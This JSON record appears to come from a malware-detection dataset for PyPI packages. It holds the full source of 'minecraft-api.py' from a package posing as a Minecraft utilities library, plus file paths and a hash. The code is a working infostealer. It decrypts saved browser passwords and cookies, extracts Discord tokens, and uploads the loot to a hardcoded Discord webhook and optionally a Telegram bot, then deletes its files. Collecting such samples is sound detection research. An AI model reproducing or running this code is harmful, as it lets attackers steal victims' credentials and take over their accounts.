[
  {
    "pyfile": "minecraft-api.py",
    "malicious_code_snippets": "import os\nimport re\nfrom base64 import b64decode\nfrom json import loads\nfrom shutil import copy2\nfrom sqlite3 import connect\n\nimport win32crypt\nfrom Cryptodome.Cipher import AES\nfrom requests import post\n\nlocal = os.getenv('LOCALAPPDATA')\nroaming = os.getenv('APPDATA')\n\ntokenPaths = {\n    'Discord': f\"{roaming}\\\\Discord\",\n    'Discord Canary': f\"{roaming}\\\\discordcanary\",\n    'Discord PTB': f\"{roaming}\\\\discordptb\",\n    'Google Chrome': f\"{local}\\\\Google\\\\Chrome\\\\User Data\\\\Default\",\n    'Opera': f\"{roaming}\\\\Opera Software\\\\Opera Stable\",\n    'Brave': f\"{local}\\\\BraveSoftware\\\\Brave-Browser\\\\User Data\\\\Default\",\n    'Yandex': f\"{local}\\\\Yandex\\\\YandexBrowser\\\\User Data\\\\Default\",\n    'OperaGX': f\"{roaming}\\\\Opera Software\\\\Opera GX Stable\"\n}\n\nbrowser_loc = {\n    \"Chrome\": f\"{local}\\\\Google\\\\Chrome\",\n    \"Brave\": f\"{local}\\\\BraveSoftware\\\\Brave-Browser\",\n    \"Edge\": f\"{local}\\\\Microsoft\\\\Edge\",\n    \"Opera\": f\"{roaming}\\\\Opera Software\\\\Opera Stable\",\n    \"OperaGX\": f\"{roaming}\\\\Opera Software\\\\Opera GX Stable\",\n}\n\nfileCookies = \"cooks_\" + os.getlogin() + \".txt\"\nfilePass = \"passes_\" + os.getlogin() + \".txt\"\nfileInfo = \"info_\" + os.getlogin() + \".txt\"\n\n# CHROME PROFILES\nfor i in os.listdir(browser_loc['Chrome'] + \"\\\\User Data\"):\n    if i.startswith(\"Profile \"):\n        browser_loc[\"ChromeP\"] = f\"{local}\\\\Google\\\\Chrome\\\\User Data\\\\{i}\"\n# DISCORD TOKENS\ndef decrypt_token(buff, master_key):\n    try:\n        return AES.new(win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM,\n                       buff[3:15]).decrypt(buff[15:])[:-16].decode()\n    except:\n        pass\n\n\ndef get_tokens(path):\n    cleaned = []\n    tokens = []\n    done = []\n    lev_db = f\"{path}\\\\Local Storage\\\\leveldb\\\\\"\n    loc_state = f\"{path}\\\\Local State\"\n    # new method with encryption\n    if os.path.exists(loc_state):\n        with open(loc_state, \"r\") as file:\n            key = loads(file.read())['os_crypt']['encrypted_key']\n        for file in os.listdir(lev_db):\n            if not file.endswith(\".ldb\") and file.endswith(\".log\"):\n                continue\n            else:\n                try:\n                    with open(lev_db + file, \"r\", errors='ignore') as files:\n                        for x in files.readlines():\n                            x.strip()\n                            for values in re.findall(r\"dQw4w9WgXcQ:[^.*\\['(.*)'\\].*$][^\\\"]*\", x):\n                                tokens.append(values)\n                except PermissionError:\n                    continue\n        for i in tokens:\n            if i.endswith(\"\\\\\"):\n                i.replace(\"\\\\\", \"\")\n            elif i not in cleaned:\n                cleaned.append(i)\n        for token in cleaned:\n            done += [decrypt_token(b64decode(token.split('dQw4w9WgXcQ:')[1]), b64decode(key)[5:])]\n\n    else:  # old method without encryption\n        for file_name in os.listdir(path):\n            try:\n                if not file_name.endswith('.log') and not file_name.endswith('.ldb'):\n                    continue\n                for line in [x.strip() for x in open(f'{path}\\\\{file_name}', errors='ignore').readlines() if x.strip()]:\n                    for regex in (r'[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}', r'mfa\\.[\\w-]{84}'):\n                        for token in re.findall(regex, line):\n                            done.append(token)\n            except:\n                continue\n\n    return done\n\n\n# DECRYPT CIPHERS\ndef generate_cipher(aes_key, iv):\n    return AES.new(aes_key, AES.MODE_GCM, iv)\n\n\ndef decrypt_payload(cipher, payload):\n    return cipher.decrypt(payload)\n\n\n# DECRYPT BROWSER\ndef decrypt_browser(LocalState, LoginData, CookiesFile, name):\n    if os.path.exists(LocalState):\n        with open(LocalState) as f:\n            local_state = f.read()\n            local_state = loads(local_state)\n        master_key = b64decode(local_state[\"os_crypt\"][\"encrypted_key\"])\n        master_key = master_key[5:]\n        master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]\n\n        if os.path.exists(LoginData):\n            copy2(LoginData, \"TempMan.db\")\n            with connect(\"TempMan.db\") as conn:\n                cur = conn.cursor()\n            cur.execute(\"SELECT origin_url, username_value, password_value FROM logins\")\n            with open(filePass, \"a\") as f:\n                f.write(f\"*** {name} ***\\n\")\n            for index, logins in enumerate(cur.fetchall()):\n                try:\n                    if not logins[0]:\n                        continue\n                    if not logins[1]:\n                        continue\n                    if not logins[2]:\n                        continue\n                    ciphers = logins[2]\n                    init_vector = ciphers[3:15]\n                    enc_pass = ciphers[15:-16]\n\n                    cipher = generate_cipher(master_key, init_vector)\n                    dec_pass = decrypt_payload(cipher, enc_pass).decode()\n                    to_print = f\"URL : {logins[0]}\\nName: {logins[1]}\\nPass: {dec_pass}\\n\\n\"\n                    with open(filePass, \"a\") as f:\n                        f.write(to_print)\n                except (Exception, FileNotFoundError):\n                    pass\n        else:\n            with open(fileInfo, \"a\") as f:\n                f.write(f\"{name} Login Data file missing\\n\")\n        ######################################################################\n        if os.path.exists(CookiesFile):\n            copy2(CookiesFile, \"CookMe.db\")\n            with connect(\"CookMe.db\") as conn:\n                curr = conn.cursor()\n            curr.execute(\"SELECT host_key, name, encrypted_value, expires_utc FROM cookies\")\n            with open(fileCookies, \"a\") as f:\n                f.write(f\"*** {name} ***\\n\")\n            for index, cookies in enumerate(curr.fetchall()):\n                try:\n                    if not cookies[0]:\n                        continue\n                    if not cookies[1]:\n                        continue\n                    if not cookies[2]:\n                        continue\n                    if \"google\" in cookies[0]:\n                        continue\n                    ciphers = cookies[2]\n                    init_vector = ciphers[3:15]\n                    enc_pass = ciphers[15:-16]\n                    cipher = generate_cipher(master_key, init_vector)\n                    dec_pass = decrypt_payload(cipher, enc_pass).decode()\n                    to_print = f'URL : {cookies[0]}\\nName: {cookies[1]}\\nCook: {dec_pass}\\n\\n'\n                    with open(fileCookies, \"a\") as f:\n                        f.write(to_print)\n                except (Exception, FileNotFoundError):\n                    pass\n        else:\n            with open(fileInfo, \"a\") as f:\n                f.write(f\"no {name} Cookie file\\n\")\n    else:\n        with open(fileInfo, \"a\") as f:\n            f.write(f\"{name} Local State file missing\\n\")\n\n\n\n# PATH SHIT\ndef Local_State(path):\n    return f\"{path}\\\\User Data\\\\Local State\"\n\n\ndef Login_Data(path):\n    if \"Profile\" in path:\n        return f\"{path}\\\\Login Data\"\n    else:\n        return f\"{path}\\\\User Data\\\\Default\\\\Login Data\"\n\n\ndef Cookies(path):\n    if \"Profile\" in path:\n        return f\"{path}\\\\Network\\\\Cookies\"\n    else:\n        return f\"{path}\\\\User Data\\\\Default\\\\Network\\\\Cookies\"\n\n\ndef main_tokens():\n    for platform, path in tokenPaths.items():\n        if not os.path.exists(path):\n            continue\n        try:\n            tokens = set(get_tokens(path))\n        except:\n            continue\n        if not tokens:\n            continue\n        with open(fileInfo, \"a\") as f:\n            for i in tokens:\n                f.write(str(i) + \"\\n\")\n\n\ndef decrypt_files(path, browser):\n    if os.path.exists(path):\n        decrypt_browser(Local_State(path), Login_Data(path), Cookies(path), browser)\n    else:\n        with open(fileInfo, \"a\") as f:\n            f.write(browser + \" not installed\\n\")\n\n\n# WEBHOOK\ndef post_to(file):\n    token = \"TELEGRAM TOKEN\"     # put your token in here, if you don't wanna use telegram leave it like it is\n    chat_id = \"TELEGRAM CHATID\"  # \"    chatid          \"                     telegram      \"\n    webhook_url = \"https://discordapp.com/api/webhooks/1097233590070300812/YX9qYsEi0yMX5gHppNUuzk9-C4P7ZeDHVeKvWioAyMXtBp5R-KcT0d4EDdhwygTqY7iq\"  # \"    webhook         \"                     discord       \"\n    # if you don't understand it you shouldn't use it\n\n    if token == \"TELEGRAM TOKEN\":  # don't change\n        pass\n    else:\n        if chat_id == \"TELEGRAM CHATID\":  # don't change\n            pass\n        else:\n            post(\"https://api.telegram.org/bot\" + token + \"/sendDocument\", data={'chat_id': chat_id},\n                 files={'document': open(file, 'rb')})\n\n    if webhook_url == \"WEBHOOK URL\":  # don't change\n        pass\n    else:\n        post(webhook_url, files={'files': open(file, 'rb')})\n\n\nfor_handler = (\n    fileInfo,\n    filePass,\n    fileCookies,\n    \"TempMan.db\",\n    \"CookMe.db\"\n)\n\n\ndef file_handler(file):\n    if os.path.exists(file):\n        if \".txt\" in file:\n            post_to(file)\n        os.remove(file)\n\n\ndef main():\n    for name, path in browser_loc.items():\n        decrypt_files(path, name)\n    main_tokens()\n    for i in for_handler:\n        file_handler(i)\n\n\nmain()",
    "hash_value": "899eb06aab587ae3b8024cec0f521edd"
  },
  {
    "metadata": {
      "package_name": "minecraft-utilities-api-0.4.1",
      "report_path": "/home/blue/PyPIAgent/Codes/tooldetect/detect_output/guarddog/malware/minecraft-utilities-api-0.4.1.txt",
      "source_path": "/home/blue/PyPIAgent/Dataset/study/unzip_malware/minecraft-utilities-api-0.4.1/minecraft-utilities-api-0.4.1/minecraft-utilities-api/minecraft-api.py",
      "code_hash": "899eb06aab587ae3b8024cec0f521edd"
    }
  }
]